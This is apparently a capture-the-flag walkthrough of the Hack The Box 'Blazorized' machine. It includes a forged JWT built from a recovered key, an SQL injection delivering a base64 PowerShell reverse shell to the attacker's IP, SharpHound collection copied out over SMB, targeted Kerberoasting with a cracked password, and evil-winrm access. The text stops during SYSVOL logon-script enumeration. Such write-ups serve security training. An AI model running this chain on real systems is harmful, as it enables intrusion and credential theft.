# Nmap
```
# Nmap 7.95 scan initiated Mon Jul 28 15:17:14 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.22
Nmap scan report for 10.10.11.22
Host is up (0.42s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-28 05:42:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RTM+
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RTM+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-28T05:28:54
|_Not valid after:  2055-07-28T05:28:54
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-07-28T05:43:04+00:00; -9h38m19s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -9h38m19s, deviation: 0s, median: -9h38m20s
| smb2-time: 
|   date: 2025-07-28T05:42:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 28 15:21:33 2025 -- 1 IP address (1 host up) scanned in 258.99 seconds
```
Add `DC1.blazorized.htb` and `blazorized.htb` to our `/etc/hosts`

# Page check
**blazorized.htb**
![](images/Pasted%20image%2020250728154051.png)
 The index page need a few time to loading here. And I have to see this web page is totally bull shit, I have never seen any front end is such a messy.

When I press the `update` button from `Check for Update`
![](images/Pasted%20image%2020250728154819.png)
There is another sub-domain `api.blazorized.htb` here.
![](images/Pasted%20image%2020250728161245.png)
After add it to `/etc/hosts`, we can update the system correctly
![](images/Pasted%20image%2020250728154955.png)
Then we can find the other new options here.
`Blazorized.Helpers.dll` will also download into the browser, we can also to download it.

Besides them, I can also find something interesting when loading the page
![](images/Pasted%20image%2020250728155406.png)
There are so many `.dll` files used by the browser.

Then I did not find anything useful from here, so I would continue to check the other sub-domain here.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ ffuf -u http://blazorized.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.blazorized.htb" -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blazorized.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blazorized.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

admin                   [Status: 200, Size: 2037, Words: 149, Lines: 28, Duration: 370ms]

```

Add this sub-domain `admin.blazorized.htb` to our `/etc/hosts`

**admin.blazorized.htb**
![](images/Pasted%20image%2020250728154533.png)
In this place, it said powered by `Blazor Server`.
When I check the network labels, we can find :
![](images/Pasted%20image%2020250728155726.png)
I would try to use `burpsite` to check the detail of requests
![](images/Pasted%20image%2020250728155832.png)
There is a POST request here.
![](images/Pasted%20image%2020250728160000.png)

After a few requests, there’s a GET request with a bunch of binary data in the response:
![](images/Pasted%20image%2020250728160609.png)
Then we can use `Blazor Traffic Processor` from the `BApp Store` to decode them
![](images/Pasted%20image%2020250728160643.png)
That means It’s fetching an item named `jwt` from the browser local storage, and we have seen before from the network label.

**api.blazorized.htb**
The index page give use the 401 error code
![](images/Pasted%20image%2020250728160940.png)
But we can find other uri `/swagger`
![](images/Pasted%20image%2020250728161005.png)
But still nothing interesting here.

# Forging JWT credentials
Let's come back to `Blazorized.Helper.dll`
I would use `DotPeek` to `decompile` it 
![](images/Pasted%20image%2020250728162105.png)
Let's come to `Passwords` class
```
using System;
using System.Linq;


#nullable enable
namespace Blazorized.Helpers
{
  public static class Passwords
  {
    public static string allChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@^&*()-_=+|;:'<>/?";

    public static string GenerateRandomPassword(int length)
    {
      length = Math.Max(length, 32);
      try
      {
        Random random = new Random();
        return new string(Enumerable.Repeat<string>(Passwords.allChars, length).Select<string, char>((Func<string, char>) (s => s[random.Next(s.Length)])).ToArray<char>());
      }
      catch (Exception ex)
      {
        throw;
      }
    }
  }
}
```
The Passwords class has a single function to generate a random password

Continue to check `JWT` class
```
#nullable enable
namespace Blazorized.Helpers
{
  public static class JWT
  {
    private const long EXPIRATION_DURATION_IN_SECONDS = 60;
    private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
    private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
    private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
    private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";
    private static readonly string superAdminRoleClaimValue = "Super_Admin";
    private static readonly string issuer = "http://api.blazorized.htb";
    private static readonly string apiAudience = "http://api.blazorized.htb";
    private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
```

The `JWT` key is `hardcoded` along with other configuration information

Function `GenerateSuperAdminJWT` makes a different `JWT`
```
public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60)
    {
      try
      {
        List<Claim> claimList1 = new List<Claim>()
        {
          new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
          new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)
        };
        string issuer = JWT.issuer;
        string dashboardAudience = JWT.adminDashboardAudience;
        List<Claim> claimList2 = claimList1;
        SigningCredentials signingCredentials1 = JWT.GetSigningCredentials();
        DateTime? nullable1 = new DateTime?(DateTime.UtcNow.AddSeconds((double) expirationDurationInSeconds));
        DateTime? nullable2 = new DateTime?();
        DateTime? nullable3 = nullable1;
        SigningCredentials signingCredentials2 = signingCredentials1;
        return ((SecurityTokenHandler) new JwtSecurityTokenHandler()).WriteToken((SecurityToken) new JwtSecurityToken(issuer, dashboardAudience, (IEnumerable<Claim>) claimList2, nullable2, nullable3, signingCredentials2));
      }
      catch (Exception ex)
      {
        throw;
      }
    }
```

Also we can find signing and verifying the token the code uses `HS512`
```
private static SigningCredentials GetSigningCredentials()
    {
      try
      {
        return new SigningCredentials((SecurityKey) new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)), "HS512");
      }
      catch (Exception ex)
      {
        throw;
      }
    }

```

I guess we can try to create the token to access to the admin panel
```
import jwt
from time import time

secret = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
data = {
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
    "iss": "http://api.blazorized.htb",
    "aud": "http://admin.blazorized.htb",
    "exp": int(time() + 60 * 60 * 24 * 10),
}

token = jwt.encode(data, secret, algorithm='HS512')

print(token)
```
Then let's run it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ python3 admin_token.py                   
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzU0NTgzODg1fQ.x4KNka6aCypMQyilPzF7HnjHc9IkQhl2cEm_t5UeQB1epSb3wRjEdvLa8sHY8xaZ_FZTiGmsZ1GtDQaG7bMY4g

```

Then let's add to our browser storage.
![](images/Pasted%20image%2020250728162617.png)
Then we can pass the auth and access to admin panel
![](images/Pasted%20image%2020250728162639.png)
In this page, we can create posts and categories, but it would not show on the front-end page

# Sql-injection on check duplicate posts and category
![](images/Pasted%20image%2020250728162930.png)
![](images/Pasted%20image%2020250728163015.png)

In this place, we can try to use `burpsuite` to catch the request and test the injection or use `sqlmap`, or we can try to test the remote code execution
![](images/Pasted%20image%2020250728163234.png)
Then we get the feedback
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ python3 -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.22 - - [28/Jul/2025 16:32:30] "GET / HTTP/1.1" 200 -

```

That means we can get the reverse shell here.
PS: remember this is a windows machine, so we need to use `powershell` or `cmd`
use the `https://www.revshells.com/` shell and choose `Powershell #3(Base64)`
![](images/Pasted%20image%2020250728163546.png)
```
wither'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA' -- -
```

Then we can catch the reverse shell here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ nc -lnvp 443       
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.22] 51011
PS C:\Windows\system32> whoami
blazorized\nu_1055
PS C:\Windows\system32> 
```

# Bloodhound by nu_1005
After simple enumerating, I did not find something interesting here.
So I would try to use `SharpHound.exe` to help us get the information
```
PS C:\Users\NU_1055\Desktop> wget http://10.10.14.6/SharpHound.exe -outfile SharpHound.exe
PS C:\Users\NU_1055\Desktop> dir


    Directory: C:\Users\NU_1055\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/28/2025   2:28 AM        1052160 SharpHound.exe                                                        
-ar---        7/28/2025  12:29 AM             34 user.txt                                                              


PS C:\Users\NU_1055\Desktop> .\SharpHound.exe
2025-07-28T02:28:51.1465461-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-07-28T02:28:51.2403101-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-07-28T02:28:51.2559153-05:00|INFORMATION|Initializing SharpHound at 2:28 AM on 7/28/2025
2025-07-28T02:28:51.3340384-05:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for blazorized.htb : DC1.blazorized.htb
2025-07-28T02:28:51.4746665-05:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-07-28T02:28:51.5840390-05:00|INFORMATION|Beginning LDAP search for blazorized.htb
2025-07-28T02:28:51.6153231-05:00|INFORMATION|Producer has finished, closing LDAP channel
2025-07-28T02:28:51.6153231-05:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-07-28T02:29:21.8028312-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2025-07-28T02:29:34.5371644-05:00|INFORMATION|Consumers finished, closing output channel
2025-07-28T02:29:34.5684155-05:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-07-28T02:29:34.7559166-05:00|INFORMATION|Status: 110 objects finished (+110 2.55814)/s -- Using 42 MB RAM
2025-07-28T02:29:34.7559166-05:00|INFORMATION|Enumeration finished in 00:00:43.1782438
2025-07-28T02:29:34.8184154-05:00|INFORMATION|Saving cache with stats: 70 ID to type mappings.
 70 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-07-28T02:29:34.8184154-05:00|INFORMATION|SharpHound Enumeration Completed at 2:29 AM on 7/28/2025! Happy Graphing!

PS C:\Users\NU_1055\Desktop> net use \\10.10.14.6 /u:wither wither 
The command completed successfully.

PS C:\Users\NU_1055\Desktop> copy *.zip \\10.10.14.6\share
```

Remember your local machine
```
python3 -m http.server 80

┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ smbserver.py share . -username wither -password wither -smb2support

```

![](images/Pasted%20image%2020250728164450.png)
To exploit it on the windows `powershell`, we need to upload the `PowerView`
Firstly I’ll set the `SPN` on the user:
```
PS C:\programdata> Set-DomainObject -Identity RSA_4810 -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
```
Then get a ticket, outputting the hash:
```
PS C:\programdata> Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
$krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH*$5AB431F9A16255580AC64A945C3EE2EF$AE1E3FA9D3DD4523FC011F824BEAF1ADD4B48765084C51B09AE51B988B33ADE938DCCA763FD88D3DA29D0666A0198A105921ED200782D01241117A7222C98C9717FBAEADB79DF75811F45F769CDB1F80E8A2EA73999CB894BB7CC833F7DFE752A9F61684FB39AB3E9ADA2609EB336635D7050C9A68881A8018FF5941CCFA7FE381C272CFAD3901588AA892490D2A59E3E4C4056E811AAA2E8200C686156BB78202FAC986A8C9799FC7DA0E4AF126154234420697B65115DC3116DD3958A6AF6206D483A572CC368428F8B38FB00BA17BBAB46D3CE277DB8A14D51B3AE92F8D41632EC88139A13D6A2FBD08417BC74C21ADE120E7226620A2499E98EAAF308E5EAF3430E6D82713DF5754DEA62857885455DBD482A174406DBF03681EC41AB964F6E88F77139DD0DBDD132F5F785C9BD3FD6A14D441F25380643D0B14EF8052CB89EC19244530868D3EFF7549B190319020066C31E39BE34D6481E4B4949AE8F4441AC55A0F0E35454CD82ACE715D40AA632B19B24E308571CE6AF5AB3F22CFF75792F22B07F13D6A5B65318A2C6C0FF05D193A5BB51ADF3D7568BF544960A476A62E25CBE1E88B5218479A41CB7860AE2DA50D5094F706A702C85A9290C06C7EF2E7CBC2EE40600516A5BD3933613D5154A810D47799E5BD9B3AC80DC5F3CC69128580E7F74563817AF617344533E241F310E0D42F7D057535D40481A620EE28E7E0425B860925A1C69C16B533C4D7512D2B028B5EC9A04157E3852EE934D3CFA9B88F8C4EEAF31B42350E51F10F745E9CC1AFBB1FA2D91BFAF6FB149E93BAF4E06CB9D942A3B78BD13FC2D7A5833D5B901DD197A017EB400F9434833BBA097C0D09F17B35EC84A685276C14CA6FBB5CF361B7810E1B8832FC1F2CBFF50A0E5396052957CE1D38D9C23D05733C1145A3FCFC83F077BF49BE812406246E09E23B0C85ED8C5AFD4137E9643B21F85DF26CBEE0073DD9DDA3D17178654BC8DFFEE39F1F70B48FDA4029A67B6A96AD95E6ABEDB107ED255AC8B4DB45B19296B5905FF3126C50567BDEB6825AE6CD56D9F65133EF8BB0A8C0130878E4F9EB78401D33E9462F9370AB2D3486721A0C3FB38963E166C37F69992A96C6004CBD65D08ACF9B3225EED3A753A14DB6B7D3A7547E8075E56AD5D9CAC891F907F17D0B2E1B87225A5C56B72CC67E9A161A51B60F7DF2DE55CC70D5C7B940386BBD0BFA4079F1F81FEE7B90482B307F819506028910C511890D9897BCFE96BE0FB76DD45D125A773739CA0B6A0EE76945237D8B12ECA112D43F639D690113C6681033CC62A9BAE235A1865C18C170FB3F534EF44E4BD111EF651501AAA168DD58E2F109009A0A51BEF25F96747CF60C1B32696E1F885FF90504C05E24A93A2616DE3DDACE2D2DF46DEBF36DA4BE7F1A972AD48D71863BBB35A3793683380FB61DFF44F36846A2B3EC21635CFAF9D82B23D36EC546344652FFC875D8B2E1805BECCECE6839BAAD3A58D16617F4039108C21AC3622724DEF43B68776C33CC05B5082C807C14D2350FD3BEBD62C59F6C1510D95EE441D32749696195B71D8E34AE8C90D1C7BC1FD6B2D786A72E08858E20F98483C6ECB853B2D3F6782C4BB2DB433B43E623FCFCB8B0A8ABB2D2B929A3AA6EEE6E40C950D51E9F2E9C6C7DFDED56D24D68F67A3F21AC19DA0C9450F9EB53DE59B18A9981892AD2EC9CA38D825FC26F64A4B31A0D677D9509D3DFA3B33EE4106D7AD40E02C08C97513298C1298C1414EF6BF6198335C2709CD1C5BB597F
```

Then we can use john to crack this ticket hash
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ john RSA_4810.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
(Ni7856Do9854Ki05Ng0005 #) (?)     
1g 0:00:00:08 DONE (2025-07-28 16:49) 0.1245g/s 1783Kp/s 1783Kc/s 1783KC/s (p3r)version..(Camisha)
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Then we can get the credit `RSA_4810:(Ni7856Do9854Ki05Ng0005 #)`

# Shell as RSA_4810 and SSA_6010
We can check the credit for `smb` and `winrm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ nxc smb 10.10.11.22 -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.22     445    DC1              [+] blazorized.htb\RSA_4810:(Ni7856Do9854Ki05Ng0005 #) 
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ nxc winrm 10.10.11.22 -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
WINRM       10.10.11.22     5985   DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)
WINRM       10.10.11.22     5985   DC1              [+] blazorized.htb\RSA_4810:(Ni7856Do9854Ki05Ng0005 #) (Pwn3d!)
```

Then we can use `evil-winrm` to get the shell of `RSA_4810`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blazorized]
└─$ evil-winrm -i 10.10.11.22 -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'                                  

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> 

```

By checking the group of `RSA_4810`
```
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
BLAZORIZED\Remote_Support_Administrators    Group            S-1-5-21-2039403211-964143010-2924010611-1115 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

I’ll check for any in C:\Windows, and it finds a bunch by `accesschk`
```
*Evil-WinRM* PS C:\programdata> .\accesschk64 /accepteula -uwds blazorized\rsa_4810 C:\Windows

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\Windows\Tasks
RW C:\Windows\tracing
RW C:\Windows\Registration\CRMLog
 W C:\Windows\System32\Tasks
RW C:\Windows\System32\spool\drivers\color
RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
--SNIP--
```

 the important bit is that `rsa_4810 `seems to have full control over these two directories:
```
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> icacls \Windows\SYSVOL\domain\scripts\A32FF3AEAA23
\Windows\SYSVOL\domain\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
                                            BLAZORIZED\Administrator:(OI)(CI)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> icacls \Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23
\Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
                                                           BLAZORIZED\Administrator:(OI)(CI)(F)
                                                           BUILTIN\Administrators:(I)(F)
                                                           CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                                                           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                           BUILTIN\Server Operators:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
 
```

These are the directories typically used to store logon, logoff, startup, and shutdown scripts applied to users and computers in the domain.

Come back to Bloodhound
![](images/Pasted%20image%2020250728075425.png)
So this user would be our target.

i would check the last time login of this user
```
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> [DateTime]::FromFileTime((Get-ADUser SSA_6010 -properties LastLogon).LastLogon)

Monday, July 28, 2025 2:54:51 AM
```

And it has the session on DC1
![](images/Pasted%20image%2020250728075711.png)

I will continue to check its active directory configuration information:
```
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> Get-ADUser SSA_6010 -properties ScriptPath


DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
Enabled           : True
GivenName         :
Name              : SSA_6010
ObjectClass       : user
ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed
SamAccountName    : SSA_6010
ScriptPath        :
SID               : S-1-5-21-2039403211-964143010-2924010611-1124
Surname           :
UserPrincipalName : SSA_6010@blazorized.htb

```

`RSA_4810` is able to set one:
```
